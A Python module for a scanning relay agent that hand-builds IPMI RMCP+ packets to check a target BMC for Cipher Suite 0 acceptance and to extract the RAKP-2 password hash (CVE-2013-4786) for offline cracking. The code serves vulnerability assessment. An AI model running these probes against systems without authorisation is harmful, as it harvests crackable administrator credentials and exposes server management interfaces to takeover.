"""IPMI BMC probe executor for the Hakuna relay agent (Phase 4.2).

Two specific anonymous BMC misconfiguration probes over RMCP+ on UDP 623:

  - op="cipher_zero" — RMCP+ Open Session Request with auth=NONE,
    integrity=NONE, confidentiality=NONE. Detects Cipher Suite 0
    acceptance (CVE — devastating).
  - op="rakp_hash"   — RAKP message 1 with a supplied username; detects
    the RAKP-3 hash-leak (CVE-2013-4786 / spec-compliant disclosure).

## Wire format

IPMI 2.0 over RMCP+ has the following packet structure on UDP/623:

    +-- RMCP header (4 bytes)
    |     0x06 0x00 0xff 0x07
    +-- IPMI session header
    |     auth_type     (1 byte) — 0x06 for RMCP+
    |     payload_type  (1 byte) — 0x10=Open-Session-Req, 0x11=Open-Session-Resp,
    |                              0x12=RAKP-1, 0x13=RAKP-2, 0x14=RAKP-3, 0x15=RAKP-4
    |     session_id    (4 bytes, little-endian) — 0 for pre-session messages
    |     session_seq   (4 bytes, little-endian)
    |     payload_len   (2 bytes, little-endian)
    +-- Payload (per payload_type)

All multi-byte fields are LITTLE-ENDIAN (IPMI is x86-derived).

This handler builds packets by hand rather than depending on `pyipmi`
or `pyghmi` — neither library exposes the low-level RMCP+ control we
need (cipher 0 detection, deliberately incomplete RAKP-3 to provoke
the hash leak), and pulling in either is overkill for two probes.

## Design notes

- Probes are anonymous by spec.
- All work happens on a single UDP socket per probe; no retransmits.
- The handler timeout caps total time at the OS-level `recvfrom`.
- The handler DOES NOT crack the leaked RAKP-2 KEAC. It just reports
  the hex string + auth algorithm so an offline workflow can do that.
"""

from __future__ import annotations

import asyncio
import logging
import os
import socket
import struct
from typing import Any

from .method_registry import register_method

logger = logging.getLogger(__name__)


_DEFAULT_TIMEOUT_S = 10
_RMCP_HEADER = b"\x06\x00\xff\x07"  # ver=06, reserved=00, seq=ff, class=07 (IPMI)
_AUTH_TYPE_RMCPP = 0x06
_PAYLOAD_OPEN_SESSION_REQ = 0x10
_PAYLOAD_OPEN_SESSION_RESP = 0x11
_PAYLOAD_RAKP1 = 0x12
_PAYLOAD_RAKP2 = 0x13


class IpmiProbeError(Exception):
    """Any IPMI-probe failure surfaced back to the backend."""


@register_method("ipmi_probe")
async def ipmi_probe_handler(ws, task, transport_config, credentials, params) -> dict:
    """Dispatch one IPMI probe based on ``params.op``."""
    target = (transport_config or {}).get("target")
    if not target:
        raise IpmiProbeError("transport_config.target is required")
    port = int((transport_config or {}).get("port") or 0)
    op = (params or {}).get("op") or ""
    op_params = (params or {}).get("op_params") or {}
    timeout_s = int((params or {}).get("timeout_s") or _DEFAULT_TIMEOUT_S)

    handler = _OP_HANDLERS.get(op)
    if handler is None:
        raise IpmiProbeError(
            f"unknown ipmi probe op {op!r}; allowed: {sorted(_OP_HANDLERS.keys())}"
        )

    try:
        return await asyncio.wait_for(
            asyncio.to_thread(handler, target, port, op_params, timeout_s),
            timeout=timeout_s + 2,
        )
    except asyncio.TimeoutError:
        return {"_errors": {op: f"probe timed out after {timeout_s}s for {target}:{port}"}}


# ── RMCP+ packet builders ────────────────────────────────────────────


def _build_ipmi_session(payload_type: int, session_id: int, session_seq: int, payload: bytes) -> bytes:
    """IPMI 2.0 session header + payload (after the 4-byte RMCP header)."""
    return (
        bytes([_AUTH_TYPE_RMCPP, payload_type])
        + struct.pack("<I", session_id)
        + struct.pack("<I", session_seq)
        + struct.pack("<H", len(payload))
        + payload
    )


def _build_open_session_req_cipher_zero(console_session_id: int) -> bytes:
    """Build an Open Session Request with all-NONE algorithms (Cipher Suite 0).

    Payload layout (IPMI 2.0 spec, table 13-17):
      message tag (1)        = 0x00
      requested max priv (1) = 0x04 (administrator)
      reserved (2)           = 0x00 0x00
      console session id (4) = pseudorandom, echoed by BMC
      auth payload (8 bytes):
        type=0x00, reserved x2, length=0x08, algo=0x00 (RAKP-NONE), reserved x3
      integrity payload (8 bytes):
        type=0x01, reserved x2, length=0x08, algo=0x00 (NONE), reserved x3
      confidentiality payload (8 bytes):
        type=0x02, reserved x2, length=0x08, algo=0x00 (NONE), reserved x3
    Total: 32 bytes.
    """
    auth_payload = bytes([0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00])
    integ_payload = bytes([0x01, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00])
    conf_payload = bytes([0x02, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00])
    return (
        bytes([0x00, 0x04, 0x00, 0x00])               # tag, priv, reserved x2
        + struct.pack("<I", console_session_id)
        + auth_payload + integ_payload + conf_payload
    )


def _build_open_session_req_hmac_sha1(console_session_id: int) -> bytes:
    """Open Session Request with HMAC-SHA1 auth (algo=01) for the RAKP probe.

    The RAKP hash leak doesn't require Cipher Suite 0 — we ask for a real
    auth algo so the BMC actually exchanges RAKP-1/RAKP-2 with us. SHA1
    (algo 0x01) is universally supported.
    """
    auth_payload = bytes([0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])
    integ_payload = bytes([0x01, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])
    conf_payload = bytes([0x02, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])
    return (
        bytes([0x00, 0x04, 0x00, 0x00])
        + struct.pack("<I", console_session_id)
        + auth_payload + integ_payload + conf_payload
    )


def _build_rakp1(managed_session_id: int, console_random: bytes, username: str) -> bytes:
    """Build RAKP message 1 (table 13-22).

      message tag (1)             = 0x00
      reserved (3)
      managed system session id (4, little-endian) — from Open Session Resp
      console random number (16)
      requested max priv (1)      = 0x14 (admin + name-only lookup)
      reserved (2)
      username length (1)
      username (variable, up to 16)
    """
    if len(console_random) != 16:
        raise IpmiProbeError("console_random must be 16 bytes")
    uname_bytes = username.encode("ascii", "replace")[:16]
    return (
        bytes([0x00, 0x00, 0x00, 0x00])
        + struct.pack("<I", managed_session_id)
        + console_random
        + bytes([0x14, 0x00, 0x00, len(uname_bytes)])
        + uname_bytes
    )


# ── Parsers ──────────────────────────────────────────────────────────


def _parse_ipmi_session_header(buf: bytes) -> tuple[int, int, int, bytes] | None:
    """Strip RMCP + IPMI 2.0 session header. Return (payload_type, session_id,
    session_seq, payload) or None if the buffer isn't a well-formed RMCP+
    packet."""
    if len(buf) < 16 or buf[:4] != _RMCP_HEADER:
        return None
    if buf[4] != _AUTH_TYPE_RMCPP:
        # Not an RMCP+ packet (could be a legacy IPMI 1.5 reply on a
        # vintage BMC; not interesting for our 2.0-era probes).
        return None
    payload_type = buf[5]
    session_id = struct.unpack("<I", buf[6:10])[0]
    session_seq = struct.unpack("<I", buf[10:14])[0]
    payload_len = struct.unpack("<H", buf[14:16])[0]
    payload = buf[16:16 + payload_len]
    if len(payload) < payload_len:
        return None
    return payload_type, session_id, session_seq, payload


def _parse_open_session_resp(payload: bytes) -> dict | None:
    """Parse Open Session Response (table 13-18).

    We need: status code, chosen auth algo, managed system session ID.
    """
    if len(payload) < 36:
        return None
    msg_tag = payload[0]
    status = payload[1]
    priv = payload[2]
    # payload[3] reserved
    console_sid = struct.unpack("<I", payload[4:8])[0]
    managed_sid = struct.unpack("<I", payload[8:12])[0]
    # auth payload (8 bytes) at offset 12
    chosen_auth = payload[16] if len(payload) > 16 else None
    chosen_integ = payload[24] if len(payload) > 24 else None
    chosen_conf = payload[32] if len(payload) > 32 else None
    return {
        "msg_tag": msg_tag,
        "status": status,
        "privilege": priv,
        "console_session_id": console_sid,
        "managed_session_id": managed_sid,
        "chosen_auth_algo": chosen_auth,
        "chosen_integ_algo": chosen_integ,
        "chosen_conf_algo": chosen_conf,
    }


def _parse_rakp2(payload: bytes) -> dict | None:
    """Parse RAKP message 2 (table 13-22).

      message tag (1)
      RMCP+ status code (1)
      reserved (2)
      console session id (4, little-endian)
      managed system random (16)
      managed system GUID (16)
      KEAC (variable: 20 bytes for HMAC-SHA1, 32 for HMAC-SHA256)
    """
    if len(payload) < 40:
        return None
    msg_tag = payload[0]
    status = payload[1]
    console_sid = struct.unpack("<I", payload[4:8])[0]
    managed_random = payload[8:24]
    managed_guid = payload[24:40]
    keac = payload[40:]  # rest of the buffer
    return {
        "msg_tag": msg_tag,
        "status": status,
        "console_session_id": console_sid,
        "managed_random": managed_random,
        "managed_guid": managed_guid,
        "keac": keac,
    }


# ── Probes ───────────────────────────────────────────────────────────


def _probe_cipher_zero(target: str, port: int, op_params: dict, timeout_s: int) -> dict:
    """Send RMCP+ Open Session Request with cipher 0 and check the reply.

    Vulnerability decision: the BMC responds with status=0 (no error)
    AND echoes auth/integ/conf algo all = 0 — meaning it accepted the
    null cipher. Either field non-zero in the response OR a non-zero
    status = the BMC refused or downgraded; not vulnerable.
    """
    port = port or 623
    out: dict[str, Any] = {
        "cipher_zero_accepted": False, "bmc_responded": False,
        "session_id": None, "status_code": None,
    }
    console_sid = struct.unpack("<I", os.urandom(4))[0] or 0xa0a2a3a4
    payload = _build_open_session_req_cipher_zero(console_sid)
    pkt = _RMCP_HEADER + _build_ipmi_session(_PAYLOAD_OPEN_SESSION_REQ, 0, 0, payload)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout_s)
    except OSError as e:
        return {"_errors": {"cipher_zero": f"socket: {e}"}}
    try:
        sock.sendto(pkt, (target, port))
        try:
            data, _peer = sock.recvfrom(2048)
        except socket.timeout:
            return {"_errors": {"cipher_zero": f"no reply within {timeout_s}s"}}
        parsed = _parse_ipmi_session_header(data)
        if parsed is None:
            return {"_errors": {"cipher_zero": "malformed RMCP+ reply"}}
        payload_type, _sid, _seq, resp_payload = parsed
        out["bmc_responded"] = True
        if payload_type != _PAYLOAD_OPEN_SESSION_RESP:
            return {**out, "_errors": {"cipher_zero": f"unexpected payload_type=0x{payload_type:02x}"}}
        info = _parse_open_session_resp(resp_payload)
        if info is None:
            return {**out, "_errors": {"cipher_zero": "open session response too short"}}
        out["status_code"] = info["status"]
        out["session_id"] = f"{info['managed_session_id']:08x}"
        # Verdict: status 0 + all three chosen algorithms zero = cipher zero accepted.
        if (
            info["status"] == 0
            and info["chosen_auth_algo"] == 0
            and info["chosen_integ_algo"] == 0
            and info["chosen_conf_algo"] == 0
        ):
            out["cipher_zero_accepted"] = True
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return out


def _probe_rakp_hash(target: str, port: int, op_params: dict, timeout_s: int) -> dict:
    """Detect the RAKP-3 hash-disclosure: open a SHA1 session, send RAKP-1
    with the supplied username, see if RAKP-2 comes back with status=0 and
    a non-zero KEAC.

    Per CVE-2013-4786 / IPMI 2.0 spec design: the BMC returns the user's
    HMAC during RAKP-2 *before* verifying the client's RAKP-3 HMAC. So
    the KEAC in any non-error RAKP-2 is offline-crackable.
    """
    port = port or 623
    username = (op_params or {}).get("username") or "admin"
    out: dict[str, Any] = {
        "hash_leaked": False, "username_tested": username,
        "keac_hex": None, "auth_algo": None,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout_s / 2 if timeout_s > 2 else timeout_s)
    except OSError as e:
        return {"_errors": {"rakp_hash": f"socket: {e}"}}

    try:
        # Step 1: Open Session Request with HMAC-SHA1 cipher
        console_sid = struct.unpack("<I", os.urandom(4))[0] or 0xb1b2b3b4
        os_req_pl = _build_open_session_req_hmac_sha1(console_sid)
        pkt = _RMCP_HEADER + _build_ipmi_session(_PAYLOAD_OPEN_SESSION_REQ, 0, 0, os_req_pl)
        sock.sendto(pkt, (target, port))
        try:
            data, _peer = sock.recvfrom(2048)
        except socket.timeout:
            return {"_errors": {"rakp_hash": "no Open Session Response"}}
        parsed = _parse_ipmi_session_header(data)
        if parsed is None or parsed[0] != _PAYLOAD_OPEN_SESSION_RESP:
            return {"_errors": {"rakp_hash": "malformed/unexpected Open Session reply"}}
        os_resp = _parse_open_session_resp(parsed[3])
        if os_resp is None or os_resp["status"] != 0:
            status = os_resp["status"] if os_resp else "?"
            return {"_errors": {"rakp_hash": f"Open Session denied (status={status})"}}
        managed_sid = os_resp["managed_session_id"]
        out["auth_algo"] = os_resp["chosen_auth_algo"]

        # Step 2: RAKP-1 with the target username
        console_random = os.urandom(16)
        rakp1_pl = _build_rakp1(managed_sid, console_random, username)
        pkt = _RMCP_HEADER + _build_ipmi_session(_PAYLOAD_RAKP1, 0, 0, rakp1_pl)
        sock.sendto(pkt, (target, port))
        try:
            data, _peer = sock.recvfrom(2048)
        except socket.timeout:
            return {"_errors": {"rakp_hash": "no RAKP-2 reply"}}
        parsed = _parse_ipmi_session_header(data)
        if parsed is None or parsed[0] != _PAYLOAD_RAKP2:
            return {"_errors": {"rakp_hash": "malformed/unexpected RAKP-2"}}
        rakp2 = _parse_rakp2(parsed[3])
        if rakp2 is None:
            return {"_errors": {"rakp_hash": "RAKP-2 too short"}}

        # Verdict: status 0 + non-zero KEAC = hash disclosed.
        if rakp2["status"] == 0 and rakp2["keac"] and any(b != 0 for b in rakp2["keac"]):
            out["hash_leaked"] = True
            out["keac_hex"] = rakp2["keac"].hex()
        elif rakp2["status"] != 0:
            # Common: status 0x0d = "invalid role / unauthorized name" =
            # username doesn't exist on the BMC. Not a vuln, just no leak.
            out["status_code"] = rakp2["status"]
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return out


# ── Relay-side allowlist ─────────────────────────────────────────────


_OP_HANDLERS: dict[str, Any] = {
    "cipher_zero": _probe_cipher_zero,
    "rakp_hash": _probe_rakp_hash,
}
